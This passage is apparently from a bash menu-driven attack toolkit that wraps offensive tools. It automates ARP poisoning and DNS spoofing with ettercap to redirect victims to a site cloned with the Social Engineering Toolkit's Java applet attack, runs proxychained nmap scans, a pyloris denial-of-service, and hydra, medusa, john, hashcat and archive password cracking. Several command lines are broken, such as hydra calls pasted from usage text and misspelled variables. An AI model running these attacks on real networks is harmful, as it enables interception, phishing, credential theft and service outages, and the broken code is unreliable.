		( pkill msgsnarf 1> /dev/null 2> /dev/null ) &
		( pkill urlsnarf 1> /dev/null 2> /dev/null ) &

		sleep 3

		echo "[*] Restoring Firewall Configuration ..."
		iptables -F 1> /dev/null 2> /dev/null
		iptables -F -t nat 1> /dev/null 2> /dev/null
		iptables -F -t mangle 1> /dev/null 2> /dev/null
		iptables -X 1> /dev/null 2> /dev/null
		iptables -X -t nat 1> /dev/null 2> /dev/null
		iptables -X -t mangle 1> /dev/null 2> /dev/null
		iptables -F 1> /dev/null 2> /dev/null
		iptables -F -t nat 1> /dev/null 2> /dev/null
		iptables -F -t mangle 1> /dev/null 2> /dev/null
		iptables -X 1> /dev/null 2> /dev/null
		iptables -X -t nat 1> /dev/null 2> /dev/null
		iptables -X -t mangle 1> /dev/null 2> /dev/null
		iptables -P INPUT ACCEPT 1> /dev/null 2> /dev/null
		iptables -P OUTPUT ACCEPT 1> /dev/null 2> /dev/null
		iptables -P FORWARD ACCEPT 1> /dev/null 2> /dev/null

		f_art

		echo "0" > /proc/sys/net/ipv4/ip_forward

		f_return_to_menu

	}

	f_lanattack_exploit () {

		f_art
		echo "Work In Progress"
		sleep 3
		f_lanattack

	}

	f_lanattack_SET () {

		f_art

		localip=$( ifconfig | grep "indirizzo inet:" | grep -v "127.0.0.1" | sed -e 's/indirizzo inet://g' | awk '{printf $1}' )

		echo "1" > /proc/sys/net/ipv4/ip_forward

		f_art

		echo "1" > /proc/sys/net/ipv4/ip_forward

		echo -n "Enter The Interface : "
		read interface

		echo "[*] Launching Netdiscover, to identify Host ..."

		if [ -e "/netdiscover.txt" ]; then
			mv /netdiscover.txt /netdiscover.txt.tmp.back
		fi

		if [ -e "/netdiscover.sh" ]; then
			mv /netdiscover.sh /netdiscover.sh.tmp.back
		fi

		pkill netdiscover 1> /dev/null 2> /dev/null
		( netdiscover -p -P -L -i $interface >> /netdiscover.txt 2> /dev/null ) &

		echo "#!/bin/bash" >> /netdiscover.sh
		echo "file=/goes.txt.back.tack.pap"  >> /netdiscover.sh
		echo "until [ ! -e pepfile ]; do" | sed -e 's/pep/$/g' >> /netdiscover.sh
		echo "	clear" >> /netdiscover.sh
		echo "	cat netdiscover.txt | sort -u | awk '{print pep1}'" | sed -e 's/pep/$/g' >> /netdiscover.sh
		echo "	sleep 5" >> /netdiscover.sh
		echo "done" >> /netdiscover.sh
		chmod 777 /netdiscover.sh

		( xterm -hold -geometry 75x25+700+40 -T " IP List " -e bash /netdiscover.sh ) &

		echo ""
		echo ""
		echo -n "Press Any Key When You Wanna To Stop : "
		read key
		
		killall netdiscover
		
		touch /goes.txt.back.tack.pap
		sleep 5
		rm -f /netdiscover.txt
		if [ -e "/netdiscover.txt.tmp.back" ]; then
			mv /netdiscover.txt.tmp.back /netdiscover.txt
		fi
		rm -f /netdiscover.sh
		if [ -e "/netdiscover.sh" ]; then
			mv /netdiscover.sh.tmp.back /netdiscover.sh
		fi
		
		rm -f touch /goes.txt.back.tack.pap
		
		f_art

		echo -n "Enter Victim Ip (empty to attack all pc's, but very slow) : "
		read victimip

		echo -n "Insert WebSite To Clone : "
		read web

		mv /usr/share/ettercap/etter.dns  /usr/share/ettercap/etter.dns.back
		touch /usr/share/ettercap/etter.dns

		echo "$web A $localip" >> /usr/share/ettercap/etter.dns

		echo "[*} Arping The Network ... "
		( xterm -geometry 75x25+700+40 -T "Ettercap ARP" -e ettercap -T -q -P dns_spoof -M ARP /$victimip/ // )

		sleep 5

		clear

		echo "[*] Launching SET ..."
		( xterm -geometry 75x25+700+40 -T "Social Engineering Toolkit" -e bash /pentest/set/set )

		sleep 5

		f_art

		echo "    1) Choose Website Attack Attack Vectors (Type 1)"

		sleep 3

		echo "    2) Choose Java Applet Attack (Type 1)"

		sleep 3

		echo "    3) Choose Site Cloner (Type 2)"

		sleep 3

		echo "    4) Type The Selected Website : "
		echo "       $web"

		sleep 3

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		f_return_to_menu

	}

	lancho=0
	alivehost=1
	sniff=2
	exploit=3
	mainmenu=4
	until [ $lancho == $alivehost ] || [ $lancho == $sniff ] || [ $lancho == $exploit ] || [ $lancho == $mainmenu ]; do
		f_art
		echo "Select The Action You Wanna Do : "
		echo ""
		echo "1) Identify Alive Hosts"
		echo "2) Sniffing With Arp Attack"
		echo "3) Exploit A Pc"
		echo "4) Use SET + Arp Attack for Social Engeneering Attack"
		echo "5) Return To The Main Menu"
		echo ""
		echo -n "Enter Selection : "
		read lancho
	done

	case $lancho in

	1) f_lanattack_alive_host ;;

	2) f_lanattack_arp_attack ;;

	3) f_lanattack_exploit ;;

	4) f_lanattack_SET ;;

	5) f_menu ;;

	esac

}

f_webattack () {

	f_webattack_sql () {

		f_art
		echo "Work In Progress ..."
		sleep 3
		f_webattack

		#echo -n "Insert The IP That You Wanna Attack : "
		#read victimip


	}

	f_webattack_port_scanning () {

		f_art
		echo -n "Insert The IP That You Wanna Attack : "
		read victimip
		echo -n "Insert The Full Path Of The Log File (es /home/user/nmap.txt ) : "
		read scans

		echo ""
		echo "[*] Launching Nmap SYN STEALTH scan ..."
		proxychains nmap -sV -sC -PN -O -v $victimip >> $scans.log

		cat $scans.log | grep "Service Info" >> $scans
		echo ""
		cat $scans.log | grep "Discovered open ports" | grep -v "Discovered open ports" | awk '{print $1}' >> $scans
		rm -f $scans.log

		echo ""
		echo "Done ! "
		sleep 3
		echo "The Scans File Log Is in : $scans"

		sleep 20

		f_art

		cat $scans

		echo ""
		echo ""
		echo -n "Press Any Key To Return To The Main Menu : "

		sleep 1

		f_art

		f_return_to_menu

	}

	f_webattack_webscanning () {

		f_art
		echo "Work In Progress ..."
		sleep 3
		f_webattack

		#echo -n "Insert The IP That You Wanna Attack : "
		#read victimip

	}

	f_webattack_exploit () {

		f_art
		echo "Work In Progress ..."
		sleep 3
		f_webattack

		#f_art
		#echo -n "Insert The IP That You Wanna Attack : "
		#read victimip

		#echo -n "Insert The IP That You Wanna Attack : "
		#read victimip

		#echo -n "Insert The Full Path Of The Log File (es /home/user/nmap.txt ) : "
		#read scans

		#echo ""
		#echo "[*] Launching Nmap SYN STEALTH scan ..."
		#proxychains nmap -sV -sC -PN -O -v $victimip >> /tmp/scans.log

		#cat /tmp/scans.log | grep "Service Info : " | grep -v "Service Info : OS ">> /tmp/scans
		#echo ""
		#cat /tmp/scans.log | grep "Discovered open ports" | grep -v "Discovered open ports" | awk '{print $1}' >> /tmp/scans
		#rm -f /tmp/scans.log


	}

	f_webattack_pyloris () {

		f_art
		echo -n "Insert The IP That You Wanna Attack : "
		read victimip

		f_art
		python /pentest/pyloris/pyloris.py $victimip

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To THe Main Menu : "
		read key

		f_return_to_menu

	}

	webcho=10
	sql=1
	portscanning=2
	exploit=3
	webscanning=4
	dosattack=5
	mainmenu=6
	until [ $webcho == $alivehost ] || [ $webcho == $sniff ] || [ $webcho == $exploit ] || [ $webcho == $mainmenu ]; do
		f_art
		echo "Select The Action You Wanna Do : "
		echo ""
		echo "1) Database Attack (SQL Iniejction)"
		echo "2) Port Scanning"
		echo "3) Exploit A Pc with Metasploit"
		echo "4) Scan WebSite For Vulnerabilities"
		echo "5) DOS Attack"
		echo "6) Return To The Main Menu"
		echo ""
		echo -n "Enter Selection : "
		read webcho
	done

	case $webcho in

	1) f_webattack_sql ;;

	2) f_webattack_port_scanning ;;

	3) f_webattack_exploit ;;

	4) f_webattack_webscanning ;;

	5) f_webattack_pyloris ;;

	6) f_webattack_menu ;;

	esac

	clear
	echo "Work In progess"
	sleep 3
	f_menu

}

f_passwordcracking () {

	f_passwordcracking_online () {

		f_hydra () {

			f_hydra_login_file () {

				f_art
				echo -n "Insert The UserNames List Path (es : /home/user/usernames.txt ) : "
				read usernamelist

				f_art
				proxychains hydra -L $usernamelist [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] [-4|-6] [-x MIN:MAX:CHARSET] [server service [OPT]]|[service://server[:PORT][/OPT]]

				echo ""
				echo "Copy the Password To A File"
				
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key

				f_return_to_menu

			}

			f_hydra_login_user () {

				f_art
				echo -n "Insert The UserName (es : admin ) : "
				read username

				f_art
				proxychains hydra -l $username -p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] [-4|-6] [-x MIN:MAX:CHARSET] [server service [OPT]]|[service://server[:PORT][/OPT]]

				echo ""
				echo "Copy The Password To A File"
				
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key

				f_return_to_menu

			}

			login=100
			loginfile=1
			loginuser=2
			previousmenu=3
			mainmenu=4
			until [ $login == $loginfile ] || [ $login == $loginuser ] || [ $login == $previousmenu ] || [ $login == $mainmenu ]; do
				f_art
				echo "Select What You Wanna Do : "
				echo ""
				echo "1) Input The File With The UserNames List"
				echo "2) Input One Username"
				echo "3) Previous Menu"
				echo "4) Return To The Main Menu"
				echo ""
				echo -n "Choice : "
				read login
			done

			case $login in

			1) f_hydra_login_file ;;

			2) f_hydra_login_user ;;

			3) f_crack_online ;;

			4) f_menu ;;

			esac

		}

		f_medusa () {

			f_medusa_host_file () {

				f_medusa_login_file () {

					f_medusa_password_one () {

						f_art
						echo -n "Insert The Password (es : admin ) : "
						read password

						f_art
						proxychains medusa -H $hostfile -u $username -p $password -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n "Enter The Wordlist Path (es : /home/user/worslist.txt ) : "
						read wordlist

						f_art
						proxychains medusa -H $hostfile -u $username -P $wordlist -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_art
					echo -n "Insert The UserNames List Path (es : /home/user/usernames.txt ) : "
					read usernamelist

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ $passwordcho == $passwdsingle ] || [ $passwordcho == $passwdlist ] || [ $passwordcho == $mainmenu ]; do
						f_art
						echo "Select What You Wanna Do : "
						echo ""
						echo "1) InputA Single Password"
						echo "2) Input A Password List"
						echo "3) Return To The Main Menu"
						echo ""
						echo "Choice : "
						read passwordcho
					done

					case $passwordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_return_to_menu ;;

					esac

				}

				f_medusa_login_user () {

					f_medusa_password_one () {

						f_art
						echo -n "Insert The Password (es : admin ) : "
						read password

						f_art
						proxychains medusa -H $hostfile -u $username -p $password -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n "Enter The Wordlist Path (es : /home/user/worslist.txt ) : "
						read wordlist

						f_art
						proxychains medusa -H $hostfile -u $username -P $wordlist -O $log -s -e ns -t 6 -b -vv -M module [OPT]
						
						echo ""
						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_art
					echo -n "Insert The UserName (es : admin ) : "
					read username

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ $passwordcho == $passwdsingle ] || [ $passwordcho == $passwdlist ] || [ $passwordcho == $mainmenu ]; do
						clear
						echo "Select What You Wanna Do : "
						echo ""
						echo "1) InputA Single Password"
						echo "2) Input A Password List"
						echo "3) Return To The Main Menu"
						echo ""
						echo "Choice : "
						read passwordcho
					done

					case $passwordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_art
				echo -n "Insert The Hosts List  (es : /home/user/hosts.txt ) : "
				read hostfile

				login=100
				loginfile=1
				loginuser=2
				mainmenu=3
				until [ $login == $loginfile ] || [ $login == $loginuser ] || [ $login == $mainmenu ]; do
					f_art
					echo "Select What You Wanna Do : "
					echo ""
					echo "1) Input The File With The UserNames List"
					echo "2) Input One Username"
					echo "3) Return To The Main Menu"
					echo ""
					echo "Choice : "
					read login
				done

				case $login in

				1) f_medusa_login_file ;;

				2) f_medusa_login_user ;;

				3) f_menu ;;

				esac

			}

			f_medusa_host_ip () {

				f_medusa_login_file () {

					f_medusa_password_one () {

						f_art
						echo -n "Insert The Password (es : admin ) : "
						read password

						f_art
						proxychains medusa -h $host -u $username -p $password -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n "Enter The Wordlist Path (es : /home/user/worslist.txt ) : "
						read wordlist

						f_art
						proxychains medusa -h $host -u $username -P $wordlist -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_art
					echo -n "Insert The UserNames List Path (es : /home/user/usernames.txt ) : "
					read usernamelist

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ $passwordcho == $passwdsingle ] || [ $passwordcho == $passwdlist ] || [ $passwordcho == $mainmenu ]; do
						f_art
						echo "Select What You Wanna Do : "
						echo ""
						echo "1) InputA Single Password"
						echo "2) Input A Password List"
						echo "3) Return To The Main Menu"
						echo ""
						echo "Choice : "
						read passwordcho
					done

					case $passwordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_medusa_login_user () {

					f_medusa_password_one () {

						f_art
						echo -n "Insert The Password (es : admin ) : "
						read password

						f_art
						proxychains medusa -h $host -u $username -p $password -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo ""
						echo "Copy The Password To A File"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n "Enter The wordlist Path (es : /home/user/worslist.txt ) : "
						read wordlist

						f_art
						proxychains medusa -h $host -u $username -P $wordlist -O $log -s -e ns -t 6 -b -vv -M module [OPT]

						echo ""
						echo ""
						echo "Copy The Password To A FIle"
						
						echo ""
						echo ""
						echo -n "Press Any Key To Go Back To The Main Menu : "
						read key
		
						f_return_to_menu

					}

					f_art
					echo -n "Insert The UserName (es : admin ) : "
					read username

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ $passwordcho == $passwdsingle ] || [ $passwordcho == $passwdlist ] || [ $passwordcho == $mainmenu ]; do
						f_art
						echo "Select What You Wanna Do : "
						echo ""
						echo "1) Input A Single Password"
						echo "2) Input A Password List"
						echo "3) Return To The Main Menu"
						echo ""
						echo "Choice : "
						read passwordcho
					done

					case $passwordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_art
				echo -n "Insert The Host Ip  (es : 192.168.0.1 ) : "
				read host

				login=0
				loginfile=1
				loginuser=2
				mainmenu=3
				until [ $login == $loginfile ] || [ $login == $loginuser ] || [ $login == $mainmenu ]; do
					f_art
					echo "Select What You Wanna Do : "
					echo ""
					echo "1) Input The File With The UserNames List"
					echo "2) Input One Username"
					echo "3) Return To The Main Menu"
					echo ""
					echo "Choice : "
					read login
				done

				case $login in

				1) f_medusa_login_file ;;

				2) f_medusa_login_user ;;

				3) f_menu ;;

				esac

			}

			f_art
			echo -n "Write the LOG file (es : /home/darkeffe/log/medusa.log) : "
			read log

			host=0
			hostfile=1
			hostip=2
			mainmenu=3
			until [ $host == $hostfile] || [ $host == $hostip ] || [ $host == $mainmenu ]; do
				f_art
				echo "Select What You Wanna Do : "
				echo ""
				echo "1) Input Host From A list"
				echo "2) Input Directly The Host"
				echo "3) Return To The Main Menu"
				echo ""
				echo "Choice : "
				read host
			done

			case $host in

			1) f_medusa_host_file ;;

			2) f_medusa_host_ip ;;

			3) f_return_to_menu ;;

			esac

		}


		onlinecrack=100
		hydra=1
		medusa=2
		previousmenu=3
		mainmenu=4
		until [ $onlinecrack == $medusa ] || [ $onlinecrack == $hydra ] || [ $onlinecrack == $previousmenu ] || [ $onlinecrack == $mainmenu ]; do
			f_art
			echo "Select What You Wanna Do : "
			echo ""
			echo "1) Hydra"
			echo "2) Medusa"
			echo "3) Previous Menu"
			echo "4) Return To The Main Menu"
			echo ""
			echo -n "Choice : "
			read onlinecrack
		done

		case $onlinecrack in

		1) f_hydra ;;

		2) f_medusa ;;

		3) f_passwordcracking ;;

		4) f_return_to_menu ;;

		esac

}

	f_passwordcracking_offline () {

		f_pdfcrack () {

			f_art
			echo -n "Enter The PDF Files Path ( es : /home/user/crackme.pdf ) : "
			read pdf

			f_art
			pdfcrack $pdf

			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}

		f_archive () {

			f_zip () {

				f_fcrack_bruteforce () {

					f_art
					echo -n "Enter The Min Number of Character : "
					read min

					echo -n "Enter The Max Number of Character : "
					read max

					f_art
					fcrackzip --brute-force --length $min-$max --use-unzip $archive

					echo ""
					echo ""
					echo -n "Press Any Key To Go Back To The Main Menu : "
					read key
				
					f_return_to_menu

				}

				f_fcrack_wordlist () {

					f_art
					echo -n "Enter The wordlist Path (es : /home/user/worslist.txt ) : "
					read wordlist

					f_art
					fcrackzip --dictionary $wordlist --use-unzip $archive
					
					echo ""
					echo ""
					echo -n "Press Any Key To Go Back To The Main Menu : "
					read key
				
					f_return_to_menu

				}

				fcrackzipcho=0
				bruteforce=1
				wordlist=2
				until [ $fcrackzipcho == $bruteforce ] || [ $fcrackzipcho == $wordlist ] || [ $fcrackzipcho == $previousmenu ] || [ $fcrackzipcho == $mainmenu ]; do
					f_art
					echo "Select The Attack Mode : "
					echo ""
					echo "1) Bruteforce"
					echo "2) wordlist"
					echo "3) Previous Menu"
					echo "4) Main Menu"
					echo ""
					echo -n "Enter Your Choice : "
					read fcrackzipcho
				done

				case $fcrackzipcho in

				1) f_fcrack_bruteforce ;;

				2) f_fcrack_wordlist ;;

				3) f_archive ;;

				4) f_return_to_menu ;;

				esac

			}

			f_rar () {

				f_art

				echo -n "Number Of Threads (min 2 | max 12 ): "
				read threads

				if [ $threads -gt 12 ]; then
					echo "   !!! Too much threads, using 12 ..."
					sleep 4
					f_art
					rarcrack --type rar --threads 12 $archivepath
				elif [ $threads -lt 2 ]; then
					echo "   !!! Threads are too low, using 2 ..."
					sleep 4
					f_art
					rarcrack --type rar --threads 2 $archivepath
				else
					f_art
					rarcrack --type rar --threads $threads $archivepath
				fi
				
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				
				f_return_to_menu

			}

			f_7zip () {

				f_art

				echo -n "Number Of Threads (min 2 | max 12 ): "
				read threads

				if [ $threads -gt 12 ]; then
					echo "    !!! Too much threads, using 12 ..."
					sleep 4
					f_art
					rarcrack --type 7zip --threads 12 $archivepath
				elif [ $threads -lt 2 ]; then
					echo "    !!! Threads are too low, using 2 ..."
					sleep 4
					f_art
					rarcrack --type 7zip --threads 2 $archivepath
				else
					f_art
					rarcrack --type 7zip --threads $threads $archivepath
				fi
				
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				
				f_return_to_menu

			}

			f_art
			echo -n "Enter The Archive Path (es: /home/user/archive.[zip|rar|7zip] ) : "
			read archivepath

			archivecho=0
			zip=1
			rar=2
			sevenzip=3
			previousmenu=4
			mainmenu=5
			until [ $archivecho == $zip ] || [ $archivecho == $rar ] || [ $archivecho == $sevenzip ] || [ $archivecho == $previousmenu ] || [ $archivecho == $mainmenu ]; do
				f_art
				echo "Select The Archive Type : "
				echo ""
				echo "1) Zip"
				echo "2) Rar"
				echo "3) 7zip"
				echo "4) Previous Menu"
				echo "5) Return To The Main Menu"
				echo ""
				echo -n "Enter Choice : "
				read archivecho
			done

			case $archivecho in

			1) f_zip ;;

			2) f_rar ;;

			3) f_7zip ;;

			4) f_passwordcracking ;;

			5) f_return_to_menu ;;

			esac

		}

		f_john () {

			f_art

			echo -n "Enter The Hash or the Hash Path: "
			read hash

			echo ""

			echo -n "Enter The Wordlist Path (es : /home/user/worslist.txt ) : "
			read wordlist

			single=1
			wordlist=2
			wordlistmangled=3
			incremental=4
			previousmenu=5
			mainmenu=6
			johnchoice=10
			until [ $johnchoice == $single ] || [ $johnchoice == $wordlist ] || [ $johnchoice == $wordlistmangled ] || [ $johnchoice == $incremental ] || [ $johnchoice == $previousmenu ] || [ $johnchoice == $mainmenu ]; do
				f_art
				echo "Select The Attack Type : "
				echo ""
				echo "1) Single"
				echo "2) Wordlist"
				echo "3) Wordlist Permutated by John"
				echo "4) Incremental"
				echo "5) Previous Menu"
				echo "6) Return To The Main Menu"
				echo ""
				echo -n "Enter Choice"
				read johnchoice
			done

			f_art

			case $johnchoice in

			1)  john -single $hash 
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				f_return_to_menu
				;;

			2)  john --wordlist=$wordlisth $hash 
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				f_return_to_menu
				;;

			3)  john --wordlist=$wordlist --rules $hash 
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				f_return_to_menu
				;;

			4)  john --incremental $hash 
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				;;

			5)  f_crack_offline ;;

			6)  f_return_to_menu ;;

			esac

			sleep 10

			f_art

			f_return_to_menu

		}

		f_hashcat () {

			# Hashcat Output
			f_hashcat_output () {
				
				hash_raw=$(wc -l $hash_path | awk '{print $1}')
				hash_cracked=$(wc -l $outfile | awk '{print $1}')
					
				sleep 5
				
				f_art
				
				echo "Cracked Hash Are In $outfile"
				echo "In format: hash:pass"
				echo "Cracked $hash_cracked/$hash_raw"
					
				echo ""
				echo ""
				echo -n "Press Any Key To Go Back To The Main Menu : "
				read key
				f_return_to_menu
					
			}
			
			
			# Haschcat
			f_hashcat_cpu () {

				# Hash Type Selection
				f_hashcat_hash () {

					hash_type=999
					MD5=0
					md5_pass_salt=1
					md5_salt_pass=2
					md5_md5_pass=3
					md5_md5_md5_pass=4
					vBulletin1=5
					md5_md5_salt_pass=6
					md5_salt_md5_pass=7
					md5_salt_pass_salt=8
					md5_md5_salt_md5_pass=9
					md5_md5_pass_md5_salt=10
					md5_salt_md5_salt_pass=11
					md5_salt_md5_pass_salt=12
					vBulletin2=15
					md5_username_0_pass=30
					md5_strtoupper_md5_pass=31
					SHA1=100
					sha1_pass_salt=101
					sha1_salt_pass=102
					sha1_sha1_pass=103
					sha1_sha1_sha1_pass=104
					sha1_strtolower_username_pass=105
					MySQL=200
					MySQL4_1_5=300
					MD5_Wordpress=400
					MD5_phpBB3=400
					MD5_Unix=500
					SHA1_Base64=600
					SSHA1_Base64=700
					SHA1_Django=800
					MD4=900
					NTLM=1000
					Domain_Cached_Credentials=1100
					MD5_Chap=1200
					MSSQL=1300
					SHA256=1400
					MD5_APR=1600
					SHA512=1700
					SHA512_unix=1800

					until [ $hash_type == $MD5 ] || [ $hash_type == $md5_pass_salt ] || [ $hash_type == $md5_salt_pass ] || [ $hash_type == $md5_md5_pass ] || [ $hash_type == $md5_md5_md5_pass ] || [ $hash_type == $vBulletin1 ] || [ $hash_type == $md5_md5_salt_pass ] || [ $hash_type == $md5_salt_md5_pass ] || [ $hash_type == $md5_salt_pass_salt ] || [ $hash_type == $md5_md5_salt_md5_pass ] || [ $hash_type == $md5_md5_pass_md5_salt ] || [ $hash_type == $md5_salt_md5_salt_pass ] || [ $hash_type == $md5_salt_md5_pass_salt ] || [ $hash_type == $vBulletin2 ] || [ $hash_type == $md5_username_0_pass ] || [ $hash_type == $md5_strtoupper_md5_pass ] || [ $hash_type == $SHA1 ] || [ $hash_type == $sha1_pass_salt ] || [ $hash_type == $sha1_salt_pass ] || [ $hash_type == $sha1_sha1_pass ] || [ $hash_type == $sha1_sha1_sha1_pass ] || [ $hash_type == $sha1_strtolower_username_pass ] || [ $hash_type == $MySQL ] || [ $hash_type == $MySQL4_1_5 ] || [ $hash_type == $MD5_Wordpress ] || [ $hash_type == $MD5_phpBB3 ] || [ $hash_type == $MD5_Unix ] || [ $hash_type == $SHA1_Base64 ] || [ $hash_type == $SSHA1_Base64 ] || [ $hash_type == $SHA1_Django ] || [ $hash_type == $MD4 ] || [ $hash_type == $NTLM ] || [ $hash_type == $Domain_Cached_Credentials ] || [ $hash_type == $MD5_Chap ] || [ $hash_type == $MSSQL ] || [ $hash_type == $SHA256 ] || [ $hash_type == $MD5_APR ] || [ $hash_type == $SHA512 ] || [ $hash_type == $SHA512_unix ]; do
						f_art
						echo "HashType Selection :"
						echo ""
						echo "0) MD5"
						echo "1) md5(pass.salt)"
						echo "2) md5(salt.pass)"
						echo "3) md5(md5(pass))"
						echo "4) md5(md5(md5(pass)))"
						echo "5) vBulletin < v3.8.5"
						echo "6) md5(md5(salt).pass)"
						echo "7) md5(salt.md5(pass))"
						echo "8) md5(salt.pass.salt)"
						echo "9) md5(md5(salt).md5(pass))"
						echo "10) md5(md5(pass).md5(salt))"
						echo "11) md5(salt.md5(salt.pass))"
						echo "12) md5(salt.md5(pass.salt))"
						echo "15) vBulletin > v3.8.5"
						echo "30) md5(username.0.pass)"
						echo "31) md5(strtoupper(md5(pass)))"
						echo "100) SHA1"
						echo "101) sha1(pass.salt)"
						echo "102) sha1(salt.pass)"
						echo "103) sha1(sha1(pass))"
						echo "104) sha1(sha1(sha1(pass)))"
						echo "105) sha1(strtolower(username).pass)"
						echo "200) MySQL"
						echo "300) MySQL4.1/MySQL5"
						echo "400) MD5(Wordpress)"
						echo "400) MD5(phpBB3)"
						echo "500) MD5(Unix)"
						echo "600) SHA-1(Base64)"
						echo "700) SSHA-1(Base64)"
						echo "800) SHA-1(Django)"
						echo "900) MD4"
						echo "1000) NTLM"
						echo "1100) Domain Cached Credentials"
						echo "1200) MD5(Chap)"
						echo "1300) MSSQL"
						echo "1400) SHA256"
						echo "1600) MD5(APR)"
						echo "1700) SHA512"
						echo "1800) SHA-512(Unix)"
						echo ""
						echo ""
						echo -n "Choice : "
						read hash_type
					done	
				
				}

				# Attack Modes
				f_hashcat_wordlist () { # Hash every Word From The Wordlist And Confront It With The Hash
					
					hashcat --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type -o $outfile --output-format=1 $hash_path $wordlist
					
					f_hashcat_output
					
				}
				
				f_hashcat_combination () { # Combine The Word Of Two Wordlist : 1) word + 2) 12 ----> word12 | 12word
					
					f_art
					
					echo -n "Input The First Wordlist Full Path (es: /home/user/wordlist_1_.txt) : "
					read wordlist_1
					
					echo ""
					
					echo -n "Input The Second Wordlist Full Path (es: /home/user/wordlist_2.txt) : "
					read wordlist_2
					
					hashcat --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type -o $outfile --output-format=1 $hash_path $wordlist_1 $wordlist_2
					
					f_hashcat_output
					
				}

				f_hashcat_toggle_case () { # abc ---> ABC | Abc | ABc | AbC | abc | aBc | aBC | abC
					
					f_art
					
					echo -n "Input The Minimum Password Lenght (min 1) : "
					read toggle_min
					
					echo ""
					
					echo -n "Input The Maximum Password Lenght (max 16) : "
					read toggle_max
					
					hashcat --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --toggle-min=$toggle_min --toggle-max=$toggle_max -o $outfile --output-format=1 $hash_path $wordlist
					
					f_hashcat_output
					
				}

				f_hashcat_bruteforce () { # Every Combination From $charset

					echo -n "Insert The Minimum Password Lenght : "
					read pwd_min

					echo -n "Insert The Maximum Password Lenght : "
					read pwd_max

					f_charset

					hashcat --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --bf-pw-min=$pwd_min  --bf-pw-max=$pws_max --bf-cs-buf=$charset -o $outfile --output-format=1 $hash_path
					
					f_hashcat_output
					
				}

				f_hashcat_permute () { # ABC ---> ABC | ACB | BAC | BCA | CAB | CBA
					
					f_art
					
					echo -n "Input The Minimum Password Lenght (min 1) : "
					read perm_min
					
					echo ""
					
					echo -n "Input The Maximum Password Lenght (max 16) : "
					read perm_max
					
					hashcat --threads=$thread --attack-mode=$attack_mode --hash-mode=$hash_type --perm-min=$perm_min --perm-max=$perm_max -o $outfile --output-format=1 $hash_path $wordlist
					
					f_hashcat_output
					
				}

				f_hashcat_table () { # Table Substitution Character: abc + table(a=aA@) ---> abc | Abc | @bc
					
					f_art
					echo -n "Input The Minimum Password Lenght (min 1) : "
					read table_min
					
					echo ""
					
					echo -n "Input The Maximum Password Lenght (max 16) : "
					read table_max
					
					#echo -n "Input The Table's Full Path (es: /home/user/table.table) : "
					#read table
					
					table="/tmp/table.tmp"
					
					echo 'a=aA@4' >> $table
					echo 'b=bB' >> $table
					echo 'c=cC' >> $table
					echo 'd=dD' >> $table
					echo 'e=eE3&' >> $table
					echo 'f=fF' >> $table
					echo 'g=gG' >> $table
					echo 'h=hH' >> $table
